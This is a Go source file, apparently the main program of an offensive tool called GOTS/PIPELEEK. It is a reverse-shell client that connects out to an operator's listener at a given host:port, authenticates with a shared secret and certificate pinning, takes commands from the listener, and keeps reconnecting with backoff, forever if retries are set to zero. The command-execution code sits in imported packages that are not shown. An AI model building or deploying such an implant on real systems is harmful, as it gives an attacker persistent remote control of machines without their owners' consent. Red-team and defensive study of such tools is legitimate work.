package main

import (
	"flag"
	"fmt"
	"log"
	"time"

	"github.com/frjcomp/gots/pkg/client"
	"github.com/frjcomp/gots/pkg/config"
	"github.com/frjcomp/gots/pkg/version"
)

func printHeader() {
	fmt.Println()
	fmt.Println(` ██████╗  ██████╗ ████████╗ ██████╗  ██████╗  `)
	fmt.Println(`██╔════╝ ██╔═══██╗╚══██╔══╝██╔════╝ ██╔══██╗ `)
	fmt.Println(`██║  ███╗██║   ██║   ██║   ██████╗  ██████╔╝ `)
	fmt.Println(`██║   ██║██║   ██║   ██║   ██╔══██╗ ██╔══██╗ `)
	fmt.Println(`╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██║  ██║ `)
	fmt.Println(` ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝ `)
	fmt.Println()
}

func main() {
	var sharedSecret string
	var certFingerprint string
	var target string
	var maxRetriesStr string

	flag.StringVar(&sharedSecret, "s", "", "Shared secret for authentication")
	flag.StringVar(&sharedSecret, "shared-secret", "", "Shared secret for authentication")
	flag.StringVar(&certFingerprint, "cert-fingerprint", "", "Expected server certificate SHA256 fingerprint")
	flag.StringVar(&target, "target", "", "Target server address (host:port, required)")
	flag.StringVar(&maxRetriesStr, "retries", "", "Maximum number of retries (required, 0 = infinite)")
	flag.Parse()

	// Validate required flags
	if target == "" {
		log.Fatal("Error: --target flag is required (format: host:port)")
	}
	if maxRetriesStr == "" {
		log.Fatal("Error: --retries flag is required (0 = infinite)")
	}

	maxRetries := 0
	if _, err := fmt.Sscanf(maxRetriesStr, "%d", &maxRetries); err != nil {
		log.Fatalf("Error: --retries must be a number: %v", err)
	}

	if err := runClient(target, maxRetries, sharedSecret, certFingerprint); err != nil {
		log.Fatal(err)
	}
}

func runClient(target string, maxRetries int, sharedSecret, certFingerprint string) error {
	printHeader()

	// Load configuration with defaults and environment overrides
	cfg, err := config.LoadClientConfig(target, maxRetries, sharedSecret, certFingerprint)
	if err != nil {
		return fmt.Errorf("configuration error: %w", err)
	}

	log.Printf("Starting GOTS - PIPELEEK client...")
	log.Printf("Version: %s (commit %s, date %s)", version.Version, version.Commit, version.Date)
	log.Printf("Target: %s", cfg.Target)
	log.Printf("Max retries: %d (0 = infinite)", cfg.MaxRetries)
	if cfg.SharedSecret != "" {
		log.Printf("Shared secret authentication: enabled")
	}
	if cfg.CertFingerprint != "" {
		log.Printf("Certificate fingerprint validation: enabled")
	}

	// Print session identifier for mapping
	log.Printf("Session ID: %s", client.GetSessionID())

	connectWithRetry(cfg.Target, cfg.MaxRetries, cfg.SharedSecret, cfg.CertFingerprint, func(t, s, f string) client.ReverseClientInterface {
		return client.NewReverseClient(t, s, f)
	}, time.Sleep)
	return nil
}

type clientFactory func(target, sharedSecret, certFingerprint string) client.ReverseClientInterface

func connectWithRetry(target string, maxRetries int, sharedSecret, certFingerprint string, newClient clientFactory, sleep func(time.Duration)) {
	retries := 0
	backoff := 5 * time.Second

	for {
		cl := newClient(target, sharedSecret, certFingerprint)
		if err := cl.Connect(); err != nil {
			log.Printf("Connection failed: %v", err)

			if maxRetries > 0 {
				retries++
				if retries >= maxRetries {
					log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
					return
				}
			}

			log.Printf("Retrying in %v... (attempt %d)", backoff, retries+1)
			if sleep != nil {
				sleep(backoff)
			} else {
				time.Sleep(backoff)
			}
			backoff *= 2
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
			continue
		}

		log.Printf("Connected to listener successfully")

		if err := cl.HandleCommands(); err != nil {
			log.Printf("Connection failed: %v", err)
			_ = cl.Close()

			if maxRetries > 0 {
				retries++
				if retries >= maxRetries {
					log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
					return
				}
			}

			log.Printf("Reconnecting in %v... (attempt %d)", backoff, retries+1)
			if sleep != nil {
				sleep(backoff)
			} else {
				time.Sleep(backoff)
			}
			backoff *= 2
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
		} else {
			// Successful command handling: if infinite retries, exit; otherwise attempt one reconnect
			_ = cl.Close()
			if maxRetries == 0 {
				return
			}
			retries++
			if retries >= maxRetries {
				log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
				return
			}
			log.Printf("Reconnecting in %v... (attempt %d)", backoff, retries+1)
			if sleep != nil {
				sleep(backoff)
			} else {
				time.Sleep(backoff)
			}
			backoff *= 2
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
		}
	}
}
